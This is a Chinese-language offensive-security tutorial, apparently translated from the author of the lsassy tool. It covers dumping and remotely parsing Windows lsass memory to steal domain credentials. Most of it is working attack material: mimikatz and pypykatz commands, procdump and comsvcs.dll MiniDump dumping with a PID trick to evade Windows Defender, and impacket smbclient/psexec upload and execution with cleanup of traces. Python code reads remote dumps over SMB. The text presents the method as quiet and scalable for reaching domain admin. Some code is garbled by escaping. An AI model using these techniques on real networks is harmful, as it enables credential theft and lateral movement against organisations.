# CrackMapExec域环境提取lsass凭据
lsass.exe是一个系统重要进程，用于微软Windows系统的安全机制。它用于本地安全和登陆策略。如果结束该进程，会出现不可知的错误。注意：lsass.exe也有可能是Windang.worm、irc.ratsou.b、Webus.B、MyDoom.L、Randex.AR、Nimos.worm等病毒创建的，病毒通过软盘、群发邮件和P2P文件共享进行传播。
## CrackMapExec
CrackMapExec（CME）是一款后渗透利用工具，可帮助自动化大型活动目录(AD)网络-域安全评估任务。该工具利用AD内置功能/协议达成其功能，并规避大多数终端防护/IDS/IPS解决方案。CrackMapExec工具由Byt3bl33d3r开发和维护的，其目的是异步地能够在一组计算机上执行操作。该工具允许你使用域或本地帐户以及密码或LM-NT哈希在远程计算机上进行身份验证。

CrackMapExec是采用模块化方式开发的，可以创建该工具在登录到计算机时将执行的自己的模块。模块已经很多了，例如枚举不同的信息（DNS，Chrome凭据，已安装的防病毒软件）模块，BloodHound构建器的执行或在“组策略首选项”中查找凭据的模块。BloodHound是一个独立的Javascript Web应用程序,基于Linkurious构建,使用Electron编译,其中Neo4j数据库由PowerShell ingestor提供。

### Mimikatz模块提取lsass凭据

CrackMapExec在远程计算机上运行Mimikatz，以从lsass内存或本地安全权限子系统提取凭据。lsass包含所有安全服务提供者或SSP，它们是管理不同类型身份验证的数据包。出于实际原因，用户输入的凭据通常保存在这些SSP中，这样用户就不必在几秒或几分钟后再次输入它们。

这就是为什么Mimikatz提取位于这些不同ssp中的信息，就是因为试图找到一些身份验证机密，并将它们显示给攻击者。因此，如果一个权限帐户连接到其中一台受感染的主机，则Mimikatz模块允许你快速提取它的凭证，从而利用这个帐户的权限来攻击更多的目标。
但是今天，大多数杀毒软件已经可以检测到Mimikatz的存在或执行，并阻止它，所以CrackMapExec模块只是挂起，等待来自服务器的响应，但由于进程被杀死而无法获取。
可以使用Mimikatz检索凭证：第一行加载内存转储，第二行检索秘密。

![通过lsass远程提取凭据](_v_images/20200520153841911_16972.png)

```
sekurlsa::minidump lsass.dmp
sekurlsa::logonPasswords
```
在对目标进行攻击的时候，对方有安全软件的情况下可以先安装procdump64.exe，获取到 lsass.dmp 文件，然后在自己的环境下运行mimikatz这样就获取到目标密码。
安装procdump64.exe
这是微软自己的工具所以不会存在任何异常所以放心使用
命令如下：
```
 procdump64.exe -accepteula -ma lsass.exe lsass.dmp 
```
 获取到 lsass.dmp文件后可以用
```
 mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit 
```
来获取明文密码，最后的exit是运行完成之后停止，不然会一直运行下去

### 手动方式：Procdump

Procdump是Sysinternals套件中的一个工具，由Marc Russinovich编写，旨在帮助系统管理员。目前，这个工具集已经被大量的管理员和开发人员采用，所以微软在2006年决定购买它，并且这些可执行文件现在已经由微软签署，因此Windows认为它们是合法的。
procdump工具就是这些工具中的一种，它的任务是转储正在运行的进程内存。它会附加到进程，读取其内存并将其写入文件。

`procdump --accepteula -ma  processus_dump.dmp
`
如前所述，Mimikatz在lsass内存中寻找凭证。因此，可以将lsass内存转储到主机上，在本地下载其转储，并使用Mimikatz提取凭据。Procdump可用于转储lsass，因为它被认为是合法的，因此不会被视为恶意软件。例如，使用套件impacket中的smbclient.py将procdump发送到服务器。
```
git clone https://github.com/CoreSecurity/impacket.git
cd impacket/
python setup.py install
```
[impacjet详情](https://www.freebuf.com/sectool/175208.html)

![通过lsass远程提取凭据](_v_images/20200520153845437_1986.png)
```

smbclient.py ADSEC.LOCAL/jsnow@DC01.adsec.local

use C$
cd Windows
cd Temp
put procdump.exe
```
上传后，需要执行procdump来创建此lsass转储。

![通过lsass远程提取凭据](_v_images/20200520153845231_14892.png)
```
psexec.py adsec.local/jsnow@DC01.adsec.local "C:\\\Windows\\\Temp\\\procdump.exe -accepteula -ma lsass C:\\\Windows\\\Temp\\\lsass.dmp"

```
然后，需要将转储文件下载到攻击者的主机上，并删除远程主机上的跟踪记录。

![通过lsass远程提取凭据](_v_images/20200520153842120_25453.png)

```
#get lsass.dmp
#del procdump.exe
#del lsass.dmp
```



这种方法有不同的局限性，我们将在此处概述它们，并提出改进措施以解决这些问题。

## 限制与改进
### Linux / Windows 兼容性

第一个问题是，在测试期间，无论是用于Web测试还是用于内部测试，我主要使用Linux，而Mimikatz是专门为Windows开发的工具，最好能够在Linux计算机上执行上述攻击链。幸运的是，Skelsec的Pypykatz项目可以帮助我们解决此问题。Skelsec在纯python中开发了Mimikatz的部分实现，这意味着跨平台。像Mimikatz一样，这个工具让我们能够提取lsass转储的秘密。

![通过lsass远程提取凭据](_v_images/20200520154048896_14187.png)

`pypykatz lsa minidump lsass.dmp`

由于有了这个项目，现在可以在Linux计算机上执行所有操作。上一节中介绍的所有步骤均适用，并且将lsass dump下载到攻击者的主机后，pypykatz用于从此转储中提取用户名和密码或NT哈希。

到目前为止一切顺利，让我们继续。

### Windows Defender

现在说说由第二个由Windows防御程序引起的限制，尽管从Windows角度来看，procdump是值得信赖的工具，但Windows Defender认为转储lsass是可疑活动。转储过程完成后，Windows Defender会在几秒钟后删除转储。如果我们的连接性很好，并且转储不太大，则可以在将其删除之前先下载它。
在查看了procdump文档之后，我意识到也可以为它提供一个进程标识符(PID)。令人惊讶的是，通过为其提供lsass PID，Windows Defender不再抱怨。
此时，我们只需要使用命令tasklist查找lsass PID。

```
> tasklist /fi "name eq lsass.exe"

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
lsass.exe                      640 Services                   0     15,584 K
```

一旦检索到此PID，就可以将其与procdump一起使用。

`procdump -accepteula -ma 640 lsass.dmp`

然后，我们有足够的时间下载转储文件，然后在本地分析它。

### 手动方式太慢

发送远程主机的procdump、执行它并检索转储，这些工作都非常完美，但是这是一个非常非常慢的过程。




在本文开头，我们讨论了CrackMapExec及其模块性，这就是为什么我编写了一个模块来自动执行此“攻击”的原因。该模块会将procdump上传到目标，执行它，从lsass检索转储，然后针对CrackMapExec参数中指定的每个目标使用pypykatz对其进行分析。

该模块运行良好，但是需要很长时间才能运行。由于文件太大，有时在下载大型转储文件时甚至会超时。但是，我们需要使该过程更快。

### 转储文件大小有限制

现在，借助新的CrackMapExec模块，我们可以将lsass转储到远程主机上，并在本地和自动在Linux主机上对其进行分析。但是，进程内存转储大于几个字节，甚至几个千字节。对于lsass转储，它们可以是几兆字节，甚至几十兆字节。在我的测试期间，一些转储竟超过了150MB。

如果要自动化此过程，我们将必须找到解决方案，因为在200台计算机的子网上下载lsass转储将导致下载数十G数据。一方面，这将花费很长时间，尤其是对于其他国家/地区的全球远程计算机而言，另一方面，安全团队可能会检测到异常的网络流量。

到目前为止，我们已经有了解决问题的工具，但是这次，我们将不得不手动操作。

我们将继续使用pypykatz从lsass转储中提取凭证，由于我们只希望procdump上传远程主机，因为它是由微软签署的，所以我们不能上传pypykatz。

考虑到这一点，我们将使用的方法特点如下：为了分析本地转储，pypykatz必须打开文件并以不同的偏移量读取字节。 Pypykats不会读取太多数据，它只需要读取特定偏移量的特定数据量即可。

为了提高效率，我们的想法是在远程目标上的转储上远程读取这些偏移量和这些地址，并且只下载包含预期信息的少量转储。

因此，让我们看一下pypykatz的工作原理。到目前为止，我们一直在使用的命令行如下：

```
pypykatz lsa minidump lsass.dmp
```

在pypykate中，LSACMDHelper类处理lsa参数。当我们为其提供lsass转储时，将调用run()方法，这段代码可以在以下方法中找到：
```
###### Minidumpelif args.cmd == 'minidump':
    if args.directory:
        dir_fullpath = os.path.abspath(args.memoryfile)
        file_pattern = '*.dmp'
        if args.recursive == True:
            globdata = os.path.join(dir\_fullpath, '**', file\_pattern)
        else:	
            globdata = os.path.join(dir\_fullpath, file\_pattern)
            
        logging.info('Parsing folder %s' % dir_fullpath)
        for filename in glob.glob(globdata, recursive=args.recursive):
            logging.info('Parsing file %s' % filename)
            try:
                mimi = pypykatz.parse\_minidump\_file(filename)
                results\[filename\] = mimi
            except Exception as e:
                files\_with\_error.append(filename)
                logging.exception('Error parsing file %s ' % filename)
                if args.halt\_on\_error == True:
                    raise e
                else:
                    pass
```

lsass转储解析是在以下行实现的：

`mimi = pypykatz.parse\_minidump\_file(filename)`

该方法在pypykatz.py文件中定义：
```

from minidump.minidumpfile import MinidumpFile""""""@staticmethoddef parse\_minidump\_file(filename):
    try:
        minidump = MinidumpFile.parse(filename)
        reader = minidump.get\_reader().get\_buffered_reader()
        sysinfo = KatzSystemInfo.from_minidump(minidump)
    except Exception as e:
        logger.exception('Minidump parsing error!')
        raise e
    try:
        mimi = pypykatz(reader, sysinfo)
        mimi.start()
    except Exception as e:
        #logger.info('Credentials parsing error!')        mimi.log\_basic\_info()
        raise e
    return mimi
```

据估计，它是minidump包中的MinidumpFile类，用于处理解析。我们需要更深入一点，专注于小型转储。

在Minidumpfile类中，解析方法描述如下：
```

@staticmethoddef parse(filename):
    mf = MinidumpFile()
    mf.filename = filename
    mf.file_handle = open(filename, 'rb')
    mf._parse()
	return mf
```

**这是我们正在寻找的代码**，我们尝试分析的lsass转储被打开，然后被解析。解析仅在文件对象上使用read，seek和tell方法。

除了在远程文件上，我们只需要编写一些代码来实现这些方法即可。为此，我们将使用Impacket。
```

"""
'open' is rewritten to open and read a remote file
"""class open(object):
    def \_\_init\_\_(self, fpath, mode):
        domainName, userName, password, hostName, shareName, filePath = self._parseArg(fpath)
        """
        ImpacketSMBConnexion is a child class of impacket written to simplify the code
        """
        self.__conn = ImpacketSMBConnexion(hostName, userName, password, domainName)
        self.__fpath = filePath
        self.__currentOffset = 0
        self.\_\_tid = self.\_\_connectTree(shareName)
        self.\_\_fid = self.\_\_conn.openFile(self.\_\_tid, self.\_\_fpath)        

    """
    Parse "filename" to extract remote credentials and lsass dump location
    """
    def _parseArg(self, arg):
        pattern = re.compile(r"^(?P\[a-zA-Z0-9.-_\]+)/(?P\[^:\]+):(?P\[^@\]+)@(?P\[a-zA-Z0-9.-\]+):/(?P\[^/\]+)(?P/(?:\[^/\]*/)*\[^/\]+)$")
        matches = pattern.search(arg)
        if matches is None:
            raise Exception("{} is not valid. Expected format : domain/username:password@host:/share/path/to/file".format(arg))
        return matches.groups()
    
    def close(self):
        self.__conn.close()

    """
    Read @size bytes
    """
    def read(self, size):
        if size == 0:
            return b''
        value = self.\_\_conn.readFile(self.\_\_tid, self.\_\_fid, self.\_\_currentOffset, size)
        return value

    """
    Move offset pointer
    """
    def seek(self, offset, whence=0):
        if whence == 0:
            self.__currentOffset = offset

    """
    Return current offset
    """
    def tell(self):
        return self.__currentOffset

```
因此，我们有了在网络共享上进行身份验证的新类，并且可以使用上述方法读取远程文件。如果我们告诉minidump使用这个类而不是传统的open方法，那么minidump会毫不犹豫地读取远程内容。

![通过lsass远程提取凭据](_v_images/20200520154048690_24853.png)

```
minidump adsec.local/jsnow:Winter\_is\_coming_\\!@DC01.adsec.local:/C$/Windows/Temp/lsass.dmp
```

同样，由于pypykatz使用的是minidump，所以它可以分析远程转储而不需要完全下载它。

![通过lsass远程提取凭据](_v_images/20200520154046183_24234.png)

```
pypykatz lsa minidump adsec.local/jsnow:Winter\_is\_coming_\\!@DC01.adsec.local:/C$/Windows/Temp/lsass.dmp
```

###  优化

现在，我们有了一种远程读取和分析lsass转储的方法，而不必在我们的计算机上下载完整的150MB转储，这是向前迈出的一大步!但是，即使我们不必下载所有内容，转储也要花费很长时间，这几乎与下载整个东西一样多。这是由于每个minidump每次要读取几个字节时，都会向远程服务器发出新请求。这是非常低效的，当我们记录一些读调用时，才意识到minidump发出了许多4字节的请求。

为了克服这个问题，我实现了一个解决方案，即创建一个本地缓冲区，并在请求期间强制读取最少的字节数，以减少开销。如果一个请求需要的字节少于4096，那么我们仍然会请求4096字节，我们将在本地保存这些字节，并且我们只会将第一个字节返回给minidump。在接下来对read函数的调用中，如果请求的数据大小在本地缓冲区中，则直接返回本地缓冲区，这要快得多。另一方面，如果数据不在缓冲区中，则将请求一个4096字节的新缓冲区。

该优化非常有效，因为minidump会执行大量并发读取。实施方法如下：
```
def read(self, size):
    """
    Return an empty string if 0 bytes are requested
    """
    if size == 0:
        return b''
    if (self.\_\_buffer\_data\["offset"\] <= self.\_\_currentOffset  self.\_\_currentOffset + size):
        """
        If requested bytes are included in local buffer self.\_\_buffer\_data\["buffer"\], we return theses bytes directly
        """
        value = self.\_\_buffer\_data\["buffer"\]\[self.\_\_currentOffset - self.\_\_buffer\_data\["offset"\]:self.\_\_currentOffset - self.\_\_buffer\_data\["offset"\] + size\]
    else:
        """
        Else, we request these bytes to the remote host
        """
        self.\_\_buffer\_data\["offset"\] = self.__currentOffset
        """
        If the request asks for less then self.\_\_buffer\_min\_size bytes, we will still ask for self.\_\_buffer\_min\_size bytes and we will save them in the local buffer for next calls.
        """
        if size < self.\_\_buffer\_min_size:
            value = self.\_\_conn.readFile(self.\_\_tid, self.\_\_fid, self.\_\_currentOffset, self.\_\_buffer\_min_size)
            self.\_\_buffer\_data\["size"\] = self.\_\_buffer\_min_size
            self.\_\_total\_read += self.\_\_buffer\_min_size
        else:
            value = self.\_\_conn.read(self.\_\_tid, self.\_\_fid, self.\_\_currentOffset, size)
            self.\_\_buffer\_data\["size"\] = size
            self.\_\_total\_read += size
        self.\_\_buffer\_data\["buffer"\] = value
    self.__currentOffset += size
    """
    Return what was asked, no more.
    """
    return value\[:size\]
```
这种优化大大节省了时间，下面是在我的计算机上做的一个基准测试：

```
$ python no_opti.py
Function=minidump, Time=39.831733942

$python opti.py
Function=minidump, Time=0.897719860077
```

如果不进行此优化，则脚本将花费大约40秒钟来运行，而如果进行了优化，则将花费不到一秒钟的时间。这意味着，在小于150 MB的远程lsass转储中，提取身份验证秘密的时间不到一秒钟！

#### 从方程式中删除Procdump
我们当前的技术是依靠Procdump转储lsass内存，但是，尽管它是由Microsoft签署的，但我发现不使用它更干净，而改用Microsoft内置工具。

C:\\Windows\\System32中有一个名为comsvcs.dll的DLL，它在进程崩溃时转储进程内存。该DLL包含一个名为MiniDumpW的函数，该函数已编写，因此可以使用rundll32.exe进行调用。

![通过lsass远程提取凭据](_v_images/20200520154043573_2659.png)

前两个参数未使用，但第三个参数分为三部分。第一部分是将要转储的进程ID，第二部分是转储文件位置，第三部分是单词full，没有其他选择。

![通过lsass远程提取凭据](_v_images/20200520154042761_12468.png)

一旦解析了这3个参数，基本上该DLL将创建转储文件，并将指定的进程转储到该转储文件中。

![通过lsass远程提取凭据](_v_images/20200520154040653_2900.png)

由于有了此功能，我们可以使用comsvcs.dll来转储lsass进程，而不用上传procdump并执行它。

```
rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump " lsass.dmp full"
```
我们只需要记住，**该技术只能作为SYSTEM执行**。

#### CrackMapExec模块

使用此新工具，我修改了CrackMapExec模块，以便它从lsass转储中远程提取密码。由于pypykatz和minidump仅在python3.6以前的版本中运行，而CrackMapExec尚不兼容python3，因此我目前无法发出拉取请求，也无法将pypykatz导入到我的模块中。目前，对pypykatz的调用是通过调用我的工具的新进程完成的。mpgn正在使用适用于python 3的CrackMapexec。

### 新开发的工具

本文有两个我写的工具，你可以使用这个技巧：
我的[Github](https://github.com/Hackndo/lsassy)或[Pypi](https://github.com/Hackndo/lsassy)上都有[lsassy](https://github.com/Hackndo/lsassy)，此工具使用DLL技术或Procdump技术使用本文中讨论的所有研究来远程转储lsass。

CrackMapExec模块允许你通过在远程主机上执行lsass转储，并使用lsassy提取登录用户的凭据来自动化整个过程。通过使用Bloodhound收集的数据，还可以检测具有攻击路径的帐户成为域管理员。该技术非常实用，因为它不会产生太多噪音，并且仅在目标主机上使用合法的可执行文件。
**总结**
无论是在与python版本的兼容性，代码的整洁性和可维护性方面，还是需要将这些更改集成到CrackMapExec的工作，这项研究对我更好地了解我每天使用的工具非常有用。 现在，我有了一个运行良好且快速的工具，并且可以使用一些技巧将其集成到CrackMapExec中，以便它对我的内部测试非常有用，并且希望对你有用。

#### Lsassy

> Lsassy是一个Python库，它可以批量从目标主机中远程提取用户凭证。这个Python库使用了[impacket](https://github.com/SecureAuthCorp/impacket)项目来从lsass导出数据中远程读取所需要的字节内容，并使用了[pypykatz](https://github.com/skelsec/pypykatz)来提取用户凭证。

#### 工具要求安装
```
Python >= 3.6netaddrpypykatz>= 0.3.0Impacket
```
使用pip进行安装：
```
python3.7 -m pip install lsassy
```
使用源码安装：
```
python3.7 setup.py install
```

#### CrackMapExec模块

本项目中的CrackMapExec模块可以使用Lsassy来从受感染的主机中提取用户凭证。
CrackMapExec模块位于cme目录中：[CME Module](https://github.com/Hackndo/lsassy/tree/master/cme)。
CrackMapExec模块允许我们自动化实现整个提取过程，并且直接将目标用户的登陆凭证显示在Lsassy的输出结果中。除此之外，它还可以帮助我们根据攻击路径来检测用户账号，并提权为域管理员账号。

####  工具机制
Lsassy使用了三种不同的方法来从lsass中导出用户凭证：

> 1、使用了comsvcs.dll这个DLL以及rundll32.exe可执行程序，这种方法只会使用内置的Windows工具。
> 2、使用了procdump.exe。如果使用了这种方法，procdump.exe则需要从攻击者的主机上传至目标用户的主机，并远程执行该程序。
> 3、使用了dumpert.exe。如果使用了这种方法，dumpert.exe则需要从攻击者的主机上传至目标用户的主机，并远程执行该程序。

#### 工具运行截图

[![](_v_images/20200520160117515_27229.png!small =1000x)](https://.3001.net/_v_s/20200202/1580645273_5e36bb9961616.png)

#### 项目地址

Lsassy：【[GitHub传送门](https://github.com/Hackndo/lsassy)】



